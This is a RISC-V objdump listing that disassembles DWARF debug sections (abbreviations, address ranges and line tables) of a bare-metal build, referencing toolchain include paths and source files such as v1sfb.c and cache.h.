 160:	49053b0b          	0x49053b0b
 164:	1e000013          	li	zero,480
 168:	0e030013          	addi	zero,t1,224
 16c:	193c                	addi	a5,sp,184
 16e:	0000                	unimp
 170:	151f 2701 0119      	0x1192701151f
 176:	20000013          	li	zero,512
 17a:	0034                	addi	a3,sp,8
 17c:	0b3a0e03          	lb	t3,179(s4)
 180:	1349053b          	0x1349053b
 184:	193c193f 34210000 	0x34210000193c193f
 18c:	0300                	addi	s0,sp,384
 18e:	3a0e                	fld	fs4,224(sp)
 190:	490b3b0b          	0x490b3b0b
 194:	3c193f13          	sltiu	t5,s2,961
 198:	0019                	c.nop	6
 19a:	2200                	fld	fs0,0(a2)
 19c:	0021                	c.nop	8
 19e:	1349                	addi	t1,t1,-14
 1a0:	0000062f          	0x62f
 1a4:	03003423          	sd	a6,40(zero) # 28 <_tdata_begin+0x28>
 1a8:	3a0e                	fld	fs4,224(sp)
 1aa:	490b3b0b          	0x490b3b0b
 1ae:	02193f13          	sltiu	t5,s2,33
 1b2:	0018                	0x18
 1b4:	2400                	fld	fs0,8(s0)
 1b6:	0021                	c.nop	8
 1b8:	1349                	addi	t1,t1,-14
 1ba:	0000052f          	0x52f
 1be:	3425                	addiw	s0,s0,-23
 1c0:	0300                	addi	s0,sp,384
 1c2:	3a08                	fld	fa0,48(a2)
 1c4:	490b3b0b          	0x490b3b0b
 1c8:	02193f13          	sltiu	t5,s2,33
 1cc:	0018                	0x18
 1ce:	2600                	fld	fs0,8(a2)
 1d0:	012e                	slli	sp,sp,0xb
 1d2:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 1da:	13491927          	0x13491927
 1de:	0111                	addi	sp,sp,4
 1e0:	0712                	slli	a4,a4,0x4
 1e2:	1840                	addi	s0,sp,52
 1e4:	4296                	lw	t0,68(sp)
 1e6:	0119                	addi	sp,sp,6
 1e8:	27000013          	li	zero,624
 1ec:	0034                	addi	a3,sp,8
 1ee:	0b3a0e03          	lb	t3,179(s4)
 1f2:	13490b3b          	0x13490b3b
 1f6:	1802                	slli	a6,a6,0x20
 1f8:	0000                	unimp
 1fa:	0b28                	addi	a0,sp,408
 1fc:	1101                	addi	sp,sp,-32
 1fe:	1201                	addi	tp,tp,-32
 200:	29000007          	0x29000007
 204:	0034                	addi	a3,sp,8
 206:	0b3a0803          	lb	a6,179(s4)
 20a:	13490b3b          	0x13490b3b
 20e:	1802                	slli	a6,a6,0x20
 210:	0000                	unimp
 212:	0b2a                	slli	s6,s6,0xa
 214:	1101                	addi	sp,sp,-32
 216:	1201                	addi	tp,tp,-32
 218:	00130107          	0x130107
 21c:	2b00                	fld	fs0,16(a4)
 21e:	012e                	slli	sp,sp,0xb
 220:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 228:	01111927          	0x1111927
 22c:	0712                	slli	a4,a4,0x4
 22e:	1840                	addi	s0,sp,52
 230:	01194297          	auipc	t0,0x1194
 234:	2c000013          	li	zero,704
 238:	0005                	c.nop	1
 23a:	0b3a0803          	lb	a6,179(s4)
 23e:	13490b3b          	0x13490b3b
 242:	1802                	slli	a6,a6,0x20
 244:	0000                	unimp
 246:	052d                	addi	a0,a0,11
 248:	0300                	addi	s0,sp,384
 24a:	3a0e                	fld	fs4,224(sp)
 24c:	490b3b0b          	0x490b3b0b
 250:	00180213          	addi	tp,a6,1
 254:	2e00                	fld	fs0,24(a2)
 256:	012e                	slli	sp,sp,0xb
 258:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 260:	01111927          	0x1111927
 264:	0712                	slli	a4,a4,0x4
 266:	1840                	addi	s0,sp,52
 268:	00194297          	auipc	t0,0x194
 26c:	0000                	unimp
 26e:	1101                	addi	sp,sp,-32
 270:	1000                	addi	s0,sp,32
 272:	1106                	slli	sp,sp,0x21
 274:	1201                	addi	tp,tp,-32
 276:	0301                	addi	t1,t1,0
 278:	1b0e                	slli	s6,s6,0x23
 27a:	250e                	fld	fa0,192(sp)
 27c:	130e                	slli	t1,t1,0x23
 27e:	0005                	c.nop	1
 280:	0000                	unimp
 282:	1101                	addi	sp,sp,-32
 284:	1000                	addi	s0,sp,32
 286:	1106                	slli	sp,sp,0x21
 288:	1201                	addi	tp,tp,-32
 28a:	0301                	addi	t1,t1,0
 28c:	1b0e                	slli	s6,s6,0x23
 28e:	250e                	fld	fa0,192(sp)
 290:	130e                	slli	t1,t1,0x23
 292:	0005                	c.nop	1
 294:	0000                	unimp
 296:	1101                	addi	sp,sp,-32
 298:	2501                	sext.w	a0,a0
 29a:	130e                	slli	t1,t1,0x23
 29c:	1b0e030b          	0x1b0e030b
 2a0:	110e                	slli	sp,sp,0x23
 2a2:	1201                	addi	tp,tp,-32
 2a4:	00171007          	0x171007
 2a8:	0200                	addi	s0,sp,256
 2aa:	0024                	addi	s1,sp,8
 2ac:	0b3e0b0b          	0xb3e0b0b
 2b0:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
 2b4:	0b002403          	lw	s0,176(zero) # b0 <_tbss_end+0x2c>
 2b8:	030b3e0b          	0x30b3e0b
 2bc:	0008                	0x8
 2be:	0400                	addi	s0,sp,512
 2c0:	0035                	c.nop	13
 2c2:	1349                	addi	t1,t1,-14
 2c4:	0000                	unimp
 2c6:	2605                	addiw	a2,a2,1
 2c8:	4900                	lw	s0,16(a0)
 2ca:	06000013          	li	zero,96
 2ce:	0016                	c.slli	zero,0x5
 2d0:	0b3a0e03          	lb	t3,179(s4)
 2d4:	13490b3b          	0x13490b3b
 2d8:	0000                	unimp
 2da:	03001607          	0x3001607
 2de:	3a0e                	fld	fs4,224(sp)
 2e0:	49053b0b          	0x49053b0b
 2e4:	08000013          	li	zero,128
 2e8:	0b0b0117          	auipc	sp,0xb0b0
 2ec:	0b3a                	slli	s6,s6,0xe
 2ee:	13010b3b          	0x13010b3b
 2f2:	0000                	unimp
 2f4:	0d09                	addi	s10,s10,2
 2f6:	0300                	addi	s0,sp,384
 2f8:	3a0e                	fld	fs4,224(sp)
 2fa:	490b3b0b          	0x490b3b0b
 2fe:	0a000013          	li	zero,160
 302:	0101                	addi	sp,sp,0
 304:	1349                	addi	t1,t1,-14
 306:	1301                	addi	t1,t1,-32
 308:	0000                	unimp
 30a:	4900210b          	0x4900210b
 30e:	000b2f13          	slti	t5,s6,0
 312:	0c00                	addi	s0,sp,528
 314:	0b0b0113          	addi	sp,s6,176
 318:	0b3a                	slli	s6,s6,0xe
 31a:	13010b3b          	0x13010b3b
 31e:	0000                	unimp
 320:	0d0d                	addi	s10,s10,3
 322:	0300                	addi	s0,sp,384
 324:	3a0e                	fld	fs4,224(sp)
 326:	490b3b0b          	0x490b3b0b
 32a:	000b3813          	sltiu	a6,s6,0
 32e:	0e00                	addi	s0,sp,784
 330:	0b0b000f          	0xb0b000f
 334:	0000                	unimp
 336:	0b000f0f          	0xb000f0f
 33a:	0013490b          	0x13490b
 33e:	1000                	addi	s0,sp,32
 340:	0e030113          	addi	sp,t1,224
 344:	0b3a0b0b          	0xb3a0b0b
 348:	13010b3b          	0x13010b3b
 34c:	0000                	unimp
 34e:	0d11                	addi	s10,s10,4
 350:	0300                	addi	s0,sp,384
 352:	3a08                	fld	fa0,48(a2)
 354:	490b3b0b          	0x490b3b0b
 358:	000b3813          	sltiu	a6,s6,0
 35c:	1200                	addi	s0,sp,288
 35e:	0e030113          	addi	sp,t1,224
 362:	0b3a050b          	0xb3a050b
 366:	13010b3b          	0x13010b3b
 36a:	0000                	unimp
 36c:	03000d13          	li	s10,48
 370:	3a0e                	fld	fs4,224(sp)
 372:	490b3b0b          	0x490b3b0b
 376:	00053813          	sltiu	a6,a0,0
 37a:	1400                	addi	s0,sp,544
 37c:	0015                	c.nop	5
 37e:	00001927          	0x1927
 382:	1515                	addi	a0,a0,-27
 384:	2701                	sext.w	a4,a4
 386:	4919                	li	s2,6
 388:	00130113          	addi	sp,t1,1
 38c:	1600                	addi	s0,sp,800
 38e:	0005                	c.nop	1
 390:	1349                	addi	t1,t1,-14
 392:	0000                	unimp
 394:	03011317          	auipc	t1,0x3011
 398:	0b0e                	slli	s6,s6,0x3
 39a:	3a05                	addiw	s4,s4,-31
 39c:	01053b0b          	0x1053b0b
 3a0:	18000013          	li	zero,384
 3a4:	000d                	c.nop	3
 3a6:	0b3a0e03          	lb	t3,179(s4)
 3aa:	1349053b          	0x1349053b
 3ae:	0b38                	addi	a4,sp,408
 3b0:	0000                	unimp
 3b2:	0d19                	addi	s10,s10,6
 3b4:	0300                	addi	s0,sp,384
 3b6:	3a0e                	fld	fs4,224(sp)
 3b8:	49053b0b          	0x49053b0b
 3bc:	00053813          	sltiu	a6,a0,0
 3c0:	1a00                	addi	s0,sp,304
 3c2:	0e030113          	addi	sp,t1,224 # 3011474 <_tbss_end+0x30113f0>
 3c6:	0b3a0b0b          	0xb3a0b0b
 3ca:	1301053b          	0x1301053b
 3ce:	0000                	unimp
 3d0:	0b01131b          	0xb01131b
 3d4:	3b0b3a0b          	0x3b0b3a0b
 3d8:	0105                	addi	sp,sp,1
 3da:	1c000013          	li	zero,448
 3de:	050b0113          	addi	sp,s6,80
 3e2:	0b3a                	slli	s6,s6,0xe
 3e4:	1301053b          	0x1301053b
 3e8:	0000                	unimp
 3ea:	171d                	addi	a4,a4,-25
 3ec:	0b01                	addi	s6,s6,0
 3ee:	3a05                	addiw	s4,s4,-31
 3f0:	01053b0b          	0x1053b0b
 3f4:	1e000013          	li	zero,480
 3f8:	000d                	c.nop	3
 3fa:	0b3a0e03          	lb	t3,179(s4)
 3fe:	1349053b          	0x1349053b
 402:	0000                	unimp
 404:	131f 0300 3c0e      	0x3c0e0300131f
 40a:	0019                	c.nop	6
 40c:	2000                	fld	fs0,0(s0)
 40e:	0115                	addi	sp,sp,5
 410:	13011927          	0x13011927
 414:	0000                	unimp
 416:	3421                	addiw	s0,s0,-24
 418:	0300                	addi	s0,sp,384
 41a:	3a0e                	fld	fs4,224(sp)
 41c:	49053b0b          	0x49053b0b
 420:	3c193f13          	sltiu	t5,s2,961
 424:	0019                	c.nop	6
 426:	2200                	fld	fs0,0(a2)
 428:	0b0b000f          	0xb0b000f
 42c:	00000e03          	lb	t3,0(zero) # 0 <_tdata_begin>
 430:	03003423          	sd	a6,40(zero) # 28 <_tdata_begin+0x28>
 434:	3a0e                	fld	fs4,224(sp)
 436:	490b3b0b          	0x490b3b0b
 43a:	3c193f13          	sltiu	t5,s2,961
 43e:	0019                	c.nop	6
 440:	2400                	fld	fs0,8(s0)
 442:	0034                	addi	a3,sp,8
 444:	0b3a0e03          	lb	t3,179(s4)
 448:	13490b3b          	0x13490b3b
 44c:	1802                	slli	a6,a6,0x20
 44e:	0000                	unimp
 450:	2e25                	addiw	t3,t3,9
 452:	3f01                	addiw	t5,t5,-32
 454:	0319                	addi	t1,t1,6
 456:	3a0e                	fld	fs4,224(sp)
 458:	27053b0b          	0x27053b0b
 45c:	4919                	li	s2,6
 45e:	12011113          	0x12011113
 462:	97184007          	flq	ft0,-1679(a6)
 466:	1942                	slli	s2,s2,0x30
 468:	1301                	addi	t1,t1,-32
 46a:	0000                	unimp
 46c:	0526                	slli	a0,a0,0x9
 46e:	0300                	addi	s0,sp,384
 470:	3a08                	fld	fa0,48(a2)
 472:	49053b0b          	0x49053b0b
 476:	00180213          	addi	tp,a6,1
 47a:	2700                	fld	fs0,8(a4)
 47c:	0034                	addi	a3,sp,8
 47e:	0b3a0803          	lb	a6,179(s4)
 482:	1349053b          	0x1349053b
 486:	1802                	slli	a6,a6,0x20
 488:	0000                	unimp
 48a:	3428                	fld	fa0,104(s0)
 48c:	0300                	addi	s0,sp,384
 48e:	3a0e                	fld	fs4,224(sp)
 490:	49053b0b          	0x49053b0b
 494:	00180213          	addi	tp,a6,1
 498:	2900                	fld	fs0,16(a0)
 49a:	012e                	slli	sp,sp,0xb
 49c:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 4a4:	13491927          	0x13491927
 4a8:	0111                	addi	sp,sp,4
 4aa:	0712                	slli	a4,a4,0x4
 4ac:	1840                	addi	s0,sp,52
 4ae:	01194297          	auipc	t0,0x1194
 4b2:	2a000013          	li	zero,672
 4b6:	0005                	c.nop	1
 4b8:	0b3a0e03          	lb	t3,179(s4)
 4bc:	1349053b          	0x1349053b
 4c0:	1802                	slli	a6,a6,0x20
 4c2:	0000                	unimp
 4c4:	11010b2b          	0x11010b2b
 4c8:	1201                	addi	tp,tp,-32
 4ca:	00130107          	0x130107
 4ce:	2c00                	fld	fs0,24(s0)
 4d0:	0111010b          	0x111010b
 4d4:	0712                	slli	a4,a4,0x4
 4d6:	0000                	unimp
 4d8:	262d                	addiw	a2,a2,11
 4da:	0000                	unimp
 4dc:	2e00                	fld	fs0,24(a2)
 4de:	012e                	slli	sp,sp,0xb
 4e0:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 4e8:	13491927          	0x13491927
 4ec:	0111                	addi	sp,sp,4
 4ee:	0712                	slli	a4,a4,0x4
 4f0:	1840                	addi	s0,sp,52
 4f2:	4296                	lw	t0,68(sp)
 4f4:	0119                	addi	sp,sp,6
 4f6:	2f000013          	li	zero,752
 4fa:	0018                	0x18
 4fc:	0000                	unimp
 4fe:	2e30                	fld	fa2,88(a2)
 500:	0301                	addi	t1,t1,0
 502:	3a0e                	fld	fs4,224(sp)
 504:	27053b0b          	0x27053b0b
 508:	1119                	addi	sp,sp,-26
 50a:	1201                	addi	tp,tp,-32
 50c:	48184007          	flq	ft0,1153(a6)
 510:	9718                	0x9718
 512:	1942                	slli	s2,s2,0x30
 514:	0000                	unimp
 516:	2e31                	addiw	t3,t3,12
 518:	0301                	addi	t1,t1,0
 51a:	3a0e                	fld	fs4,224(sp)
 51c:	270b3b0b          	0x270b3b0b
 520:	1119                	addi	sp,sp,-26
 522:	1201                	addi	tp,tp,-32
 524:	96184007          	flq	ft0,-1695(a6)
 528:	1942                	slli	s2,s2,0x30
 52a:	1301                	addi	t1,t1,-32
 52c:	0000                	unimp
 52e:	0532                	slli	a0,a0,0xc
 530:	0300                	addi	s0,sp,384
 532:	3a0e                	fld	fs4,224(sp)
 534:	490b3b0b          	0x490b3b0b
 538:	00180213          	addi	tp,a6,1
 53c:	3300                	fld	fs0,32(a4)
 53e:	0005                	c.nop	1
 540:	0b3a0803          	lb	a6,179(s4)
 544:	13490b3b          	0x13490b3b
 548:	1802                	slli	a6,a6,0x20
 54a:	0000                	unimp
 54c:	3434                	fld	fa3,104(s0)
 54e:	0300                	addi	s0,sp,384
 550:	3a08                	fld	fa0,48(a2)
 552:	490b3b0b          	0x490b3b0b
 556:	00180213          	addi	tp,a6,1
 55a:	3500                	fld	fs0,40(a0)
 55c:	0034                	addi	a3,sp,8
 55e:	0b3a0803          	lb	a6,179(s4)
 562:	13490b3b          	0x13490b3b
 566:	0000                	unimp
 568:	0a36                	slli	s4,s4,0xd
 56a:	0300                	addi	s0,sp,384
 56c:	3a0e                	fld	fs4,224(sp)
 56e:	110b3b0b          	0x110b3b0b
 572:	0001                	nop
 574:	3700                	fld	fs0,40(a4)
 576:	000a                	c.slli	zero,0x2
 578:	0b3a0e03          	lb	t3,179(s4)
 57c:	0111053b          	addw	a0,sp,a7
 580:	0000                	unimp
 582:	2e38                	fld	fa4,88(a2)
 584:	0301                	addi	t1,t1,0
 586:	3a0e                	fld	fs4,224(sp)
 588:	270b3b0b          	0x270b3b0b
 58c:	4919                	li	s2,6
 58e:	12011113          	0x12011113
 592:	97184007          	flq	ft0,-1679(a6)
 596:	1942                	slli	s2,s2,0x30
 598:	1301                	addi	t1,t1,-32
 59a:	0000                	unimp
 59c:	2e39                	addiw	t3,t3,14
 59e:	3f01                	addiw	t5,t5,-32
 5a0:	0319                	addi	t1,t1,6
 5a2:	3a0e                	fld	fs4,224(sp)
 5a4:	270b3b0b          	0x270b3b0b
 5a8:	1119                	addi	sp,sp,-26
 5aa:	1201                	addi	tp,tp,-32
 5ac:	96184007          	flq	ft0,-1695(a6)
 5b0:	1942                	slli	s2,s2,0x30
 5b2:	1301                	addi	t1,t1,-32
 5b4:	0000                	unimp
 5b6:	343a                	fld	fs0,424(sp)
 5b8:	0300                	addi	s0,sp,384
 5ba:	3a08                	fld	fa0,48(a2)
 5bc:	490b3b0b          	0x490b3b0b
 5c0:	0b018813          	addi	a6,gp,176 # 800031d0 <__global_pointer$+0xb0>
 5c4:	0000                	unimp
 5c6:	0300343b          	0x300343b
 5ca:	3a0e                	fld	fs4,224(sp)
 5cc:	490b3b0b          	0x490b3b0b
 5d0:	3c000013          	li	zero,960
 5d4:	0034                	addi	a3,sp,8
 5d6:	0b3a0803          	lb	a6,179(s4)
 5da:	13490b3b          	0x13490b3b
 5de:	0188                	addi	a0,sp,192
 5e0:	0018020b          	0x18020b
 5e4:	3d00                	fld	fs0,56(a0)
 5e6:	012e                	slli	sp,sp,0xb
 5e8:	0b3a0e03          	lb	t3,179(s4)
 5ec:	01110b3b          	addw	s6,sp,a7
 5f0:	0712                	slli	a4,a4,0x4
 5f2:	1840                	addi	s0,sp,52
 5f4:	4296                	lw	t0,68(sp)
 5f6:	0119                	addi	sp,sp,6
 5f8:	3e000013          	li	zero,992
 5fc:	012e                	slli	sp,sp,0xb
 5fe:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 606:	01111927          	0x1111927
 60a:	0712                	slli	a4,a4,0x4
 60c:	1840                	addi	s0,sp,52
 60e:	01194297          	auipc	t0,0x1194
 612:	3f000013          	li	zero,1008
 616:	002e                	c.slli	zero,0xb
 618:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 620:	0111                	addi	sp,sp,4
 622:	0712                	slli	a4,a4,0x4
 624:	1840                	addi	s0,sp,52
 626:	4296                	lw	t0,68(sp)
 628:	0019                	c.nop	6
 62a:	4000                	lw	s0,0(s0)
 62c:	012e                	slli	sp,sp,0xb
 62e:	0e03193f 0b3b0b3a 	0xb3b0b3a0e03193f
 636:	01871927          	0x1871927
 63a:	1119                	addi	sp,sp,-26
 63c:	1201                	addi	tp,tp,-32
 63e:	96184007          	flq	ft0,-1695(a6)
 642:	1942                	slli	s2,s2,0x30
 644:	1301                	addi	t1,t1,-32
 646:	0000                	unimp
 648:	2e41                	addiw	t3,t3,16
 64a:	3f01                	addiw	t5,t5,-32
 64c:	0319                	addi	t1,t1,6
 64e:	3a0e                	fld	fs4,224(sp)
 650:	270b3b0b          	0x270b3b0b
 654:	8719                	srai	a4,a4,0x6
 656:	1901                	addi	s2,s2,-32
 658:	0111                	addi	sp,sp,4
 65a:	0712                	slli	a4,a4,0x4
 65c:	1840                	addi	s0,sp,52
 65e:	01194297          	auipc	t0,0x1194
 662:	42000013          	li	zero,1056
 666:	0034                	addi	a3,sp,8
 668:	0b3a0e03          	lb	t3,179(s4)
 66c:	13490b3b          	0x13490b3b
 670:	0188                	addi	a0,sp,192
 672:	0018020b          	0x18020b
 676:	4300                	lw	s0,0(a4)
 678:	012e                	slli	sp,sp,0xb
 67a:	0b3a0e03          	lb	t3,179(s4)
 67e:	19270b3b          	0x19270b3b
 682:	0111                	addi	sp,sp,4
 684:	0712                	slli	a4,a4,0x4
 686:	1840                	addi	s0,sp,52
 688:	01194297          	auipc	t0,0x1194
 68c:	44000013          	li	zero,1088
 690:	012e                	slli	sp,sp,0xb
 692:	0b3a0e03          	lb	t3,179(s4)
 696:	19270b3b          	0x19270b3b
 69a:	0111                	addi	sp,sp,4
 69c:	0712                	slli	a4,a4,0x4
 69e:	1840                	addi	s0,sp,52
 6a0:	00194297          	auipc	t0,0x194
	...

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	002c                	addi	a1,sp,8
   2:	0000                	unimp
   4:	0002                	c.slli	zero,0x0
   6:	0000                	unimp
   8:	0000                	unimp
   a:	0008                	0x8
   c:	0000                	unimp
   e:	0000                	unimp
  10:	1048                	addi	a0,sp,36
  12:	8000                	0x8000
  14:	0000                	unimp
  16:	0000                	unimp
  18:	0460                	addi	s0,sp,524
	...
  2e:	0000                	unimp
  30:	002c                	addi	a1,sp,8
  32:	0000                	unimp
  34:	0002                	c.slli	zero,0x0
  36:	0d61                	addi	s10,s10,24
  38:	0000                	unimp
  3a:	0008                	0x8
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	0000                	unimp
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	01c6                	slli	gp,gp,0x11
	...
  5e:	0000                	unimp
  60:	002c                	addi	a1,sp,8
  62:	0000                	unimp
  64:	0002                	c.slli	zero,0x0
  66:	00000d8f          	0xd8f
  6a:	0008                	0x8
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	14a8                	addi	a0,sp,616
  72:	8000                	0x8000
  74:	0000                	unimp
  76:	0000                	unimp
  78:	002e                	c.slli	zero,0xb
	...
  8e:	0000                	unimp
  90:	002c                	addi	a1,sp,8
  92:	0000                	unimp
  94:	0002                	c.slli	zero,0x0
  96:	0dbd                	addi	s11,s11,15
  98:	0000                	unimp
  9a:	0008                	0x8
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	14d6                	slli	s1,s1,0x35
  a2:	8000                	0x8000
  a4:	0000                	unimp
  a6:	0000                	unimp
  a8:	11ea                	slli	gp,gp,0x3a
	...

Disassembly of section .debug_line:

0000000000000000 <.debug_line>:
       0:	000003a3          	sb	zero,7(zero) # 7 <_tdata_begin+0x7>
       4:	0002                	c.slli	zero,0x0
       6:	0149                	addi	sp,sp,18
       8:	0000                	unimp
       a:	0101                	addi	sp,sp,0
       c:	000d0efb          	0xd0efb
      10:	0101                	addi	sp,sp,0
      12:	0101                	addi	sp,sp,0
      14:	0000                	unimp
      16:	0100                	addi	s0,sp,128
      18:	0000                	unimp
      1a:	6901                	0x6901
      1c:	636e                	ld	t1,216(sp)
      1e:	7300                	ld	s0,32(a4)
      20:	6372                	ld	t1,280(sp)
      22:	2f00                	fld	fs0,24(a4)
      24:	2f74706f          	j	47b1a <_tbss_end+0x47a96>
      28:	6972                	ld	s2,280(sp)
      2a:	36766373          	csrrsi	t1,0x367,12
      2e:	2f34                	fld	fa3,88(a4)
      30:	6972                	ld	s2,280(sp)
      32:	36766373          	csrrsi	t1,0x367,12
      36:	2d34                	fld	fa3,88(a0)
      38:	6e75                	lui	t3,0x1d
      3a:	776f6e6b          	0x776f6e6b
      3e:	2d6e                	fld	fs10,216(sp)
      40:	6c65                	lui	s8,0x19
      42:	2f66                	fld	ft10,88(sp)
      44:	6e69                	lui	t3,0x1a
      46:	64756c63          	bltu	a0,t2,69e <_tbss_end+0x61a>
      4a:	2f65                	addiw	t5,t5,25
      4c:	616d                	addi	sp,sp,240
      4e:	6e696863          	bltu	s2,t1,73e <_tbss_end+0x6ba>
      52:	0065                	c.nop	25
      54:	74706f2f          	0x74706f2f
      58:	7369722f          	0x7369722f
      5c:	34367663          	bleu	gp,a2,3a8 <_tbss_end+0x324>
      60:	7369722f          	0x7369722f
      64:	34367663          	bleu	gp,a2,3b0 <_tbss_end+0x32c>
      68:	752d                	lui	a0,0xfffeb
      6a:	6b6e                	ld	s6,216(sp)
      6c:	6f6e                	ld	t5,216(sp)
      6e:	652d6e77          	0x652d6e77
      72:	666c                	ld	a1,200(a2)
      74:	636e692f          	0x636e692f
      78:	756c                	ld	a1,232(a0)
      7a:	6564                	ld	s1,200(a0)
      7c:	7379732f          	0x7379732f
      80:	2f00                	fld	fs0,24(a4)
      82:	2f74706f          	j	47b78 <_tbss_end+0x47af4>
      86:	6972                	ld	s2,280(sp)
      88:	36766373          	csrrsi	t1,0x367,12
      8c:	2f34                	fld	fa3,88(a4)
      8e:	696c                	ld	a1,208(a0)
      90:	2f62                	fld	ft10,24(sp)
      92:	2f636367          	0x2f636367
      96:	6972                	ld	s2,280(sp)
      98:	36766373          	csrrsi	t1,0x367,12
      9c:	2d34                	fld	fa3,88(a0)
      9e:	6e75                	lui	t3,0x1d
      a0:	776f6e6b          	0x776f6e6b
      a4:	2d6e                	fld	fs10,216(sp)
      a6:	6c65                	lui	s8,0x19
      a8:	2f66                	fld	ft10,88(sp)
      aa:	2e322e37          	lui	t3,0x2e322
      ae:	2f30                	fld	fa2,88(a4)
      b0:	6e69                	lui	t3,0x1a
      b2:	64756c63          	bltu	a0,t2,70a <_tbss_end+0x686>
      b6:	0065                	c.nop	25
      b8:	74706f2f          	0x74706f2f
      bc:	7369722f          	0x7369722f
      c0:	34367663          	bleu	gp,a2,40c <_tbss_end+0x388>
      c4:	7369722f          	0x7369722f
      c8:	34367663          	bleu	gp,a2,414 <_tbss_end+0x390>
      cc:	752d                	lui	a0,0xfffeb
      ce:	6b6e                	ld	s6,216(sp)
      d0:	6f6e                	ld	t5,216(sp)
      d2:	652d6e77          	0x652d6e77
      d6:	666c                	ld	a1,200(a2)
      d8:	636e692f          	0x636e692f
      dc:	756c                	ld	a1,232(a0)
      de:	6564                	ld	s1,200(a0)
      e0:	0000                	unimp
      e2:	68636163          	bltu	t1,t1,764 <_tbss_end+0x6e0>
      e6:	2e65                	addiw	t3,t3,25
      e8:	0068                	addi	a0,sp,12
      ea:	0001                	nop
      ec:	7600                	ld	s0,40(a2)
      ee:	7331                	lui	t1,0xfffec
      f0:	6266                	ld	tp,88(sp)
      f2:	632e                	ld	t1,200(sp)
      f4:	0200                	addi	s0,sp,256
      f6:	0000                	unimp
      f8:	645f 6665 7561      	0x75616665645f
      fe:	746c                	ld	a1,232(s0)
     100:	745f 7079 7365      	0x73657079745f
     106:	682e                	ld	a6,200(sp)
     108:	0300                	addi	s0,sp,384
     10a:	0000                	unimp
     10c:	6f6c                	ld	a1,216(a4)
     10e:	682e6b63          	bltu	t3,sp,7a4 <_tbss_end+0x720>
     112:	0400                	addi	s0,sp,512
     114:	0000                	unimp
     116:	745f 7079 7365      	0x73657079745f
     11c:	682e                	ld	a6,200(sp)
     11e:	0400                	addi	s0,sp,512
     120:	0000                	unimp
     122:	64647473          	csrrci	s0,0x646,8
     126:	6665                	lui	a2,0x19
     128:	682e                	ld	a6,200(sp)
     12a:	0500                	addi	s0,sp,640
     12c:	0000                	unimp
     12e:	6572                	ld	a0,280(sp)
     130:	6e65                	lui	t3,0x19
     132:	2e74                	fld	fa3,216(a2)
     134:	0068                	addi	a0,sp,12
     136:	0004                	0x4
     138:	5f00                	lw	s0,56(a4)
     13a:	69647473          	csrrci	s0,0x696,8
     13e:	746e                	ld	s0,248(sp)
     140:	682e                	ld	a6,200(sp)
     142:	0400                	addi	s0,sp,512
     144:	0000                	unimp
     146:	6c647473          	csrrci	s0,0x6c6,8
     14a:	6269                	lui	tp,0x1a
     14c:	682e                	ld	a6,200(sp)
     14e:	0600                	addi	s0,sp,768
     150:	0000                	unimp
     152:	0000                	unimp
     154:	0209                	addi	tp,tp,2
     156:	1048                	addi	a0,sp,36
     158:	8000                	0x8000
     15a:	0000                	unimp
     15c:	0000                	unimp
     15e:	0100c603          	lbu	a2,16(ra) # 4010 <_tbss_end+0x3f8c>
     162:	0e090503          	lb	a0,224(s2) # 20e0 <_tbss_end+0x205c>
     166:	0100                	addi	s0,sp,128
     168:	0a090103          	lb	sp,160(s2)
     16c:	0100                	addi	s0,sp,128
     16e:	0a090203          	lb	tp,160(s2)
     172:	0100                	addi	s0,sp,128
     174:	0a090303          	lb	t1,160(s2)
     178:	0100                	addi	s0,sp,128
     17a:	0c090303          	lb	t1,192(s2)
     17e:	0100                	addi	s0,sp,128
     180:	08090603          	lb	a2,128(s2)
     184:	0100                	addi	s0,sp,128
     186:	04090603          	lb	a2,64(s2)
     18a:	0100                	addi	s0,sp,128
     18c:	14090303          	lb	t1,320(s2)
     190:	0100                	addi	s0,sp,128
     192:	06090303          	lb	t1,96(s2)
     196:	0100                	addi	s0,sp,128
     198:	16090403          	lb	s0,352(s2)
     19c:	0100                	addi	s0,sp,128
     19e:	0200                	addi	s0,sp,256
     1a0:	0304                	addi	s1,sp,384
     1a2:	06090303          	lb	t1,96(s2)
     1a6:	0100                	addi	s0,sp,128
     1a8:	0200                	addi	s0,sp,256
     1aa:	0304                	addi	s1,sp,384
     1ac:	0a090403          	lb	s0,160(s2)
     1b0:	0100                	addi	s0,sp,128
     1b2:	0200                	addi	s0,sp,256
     1b4:	0304                	addi	s1,sp,384
     1b6:	18097903          	0x18097903
     1ba:	0100                	addi	s0,sp,128
     1bc:	0200                	addi	s0,sp,256
     1be:	0104                	addi	s1,sp,128
     1c0:	0306                	slli	t1,t1,0x1
     1c2:	0900                	addi	s0,sp,144
     1c4:	000a                	c.slli	zero,0x2
     1c6:	0001                	nop
     1c8:	0402                	slli	s0,s0,0x0
     1ca:	0602                	slli	a2,a2,0x0
     1cc:	0a097903          	0xa097903
     1d0:	0100                	addi	s0,sp,128
     1d2:	0200                	addi	s0,sp,256
     1d4:	0104                	addi	s1,sp,128
     1d6:	0306                	slli	t1,t1,0x1
     1d8:	0900                	addi	s0,sp,144
     1da:	000a                	c.slli	zero,0x2
     1dc:	0601                	addi	a2,a2,0
     1de:	0c091203          	lh	tp,192(s2)
     1e2:	0100                	addi	s0,sp,128
     1e4:	0204                	addi	s1,sp,256
     1e6:	097faa03          	lw	s4,151(t6) # 4097 <_tbss_end+0x4013>
     1ea:	0008                	0x8
     1ec:	0301                	addi	t1,t1,0
     1ee:	0901                	addi	s2,s2,0
     1f0:	0016                	c.slli	zero,0x5
     1f2:	0301                	addi	t1,t1,0
     1f4:	0901                	addi	s2,s2,0
     1f6:	0008                	0x8
     1f8:	0301                	addi	t1,t1,0
     1fa:	0902                	slli	s2,s2,0x0
     1fc:	000a                	c.slli	zero,0x2
     1fe:	0301                	addi	t1,t1,0
     200:	0901                	addi	s2,s2,0
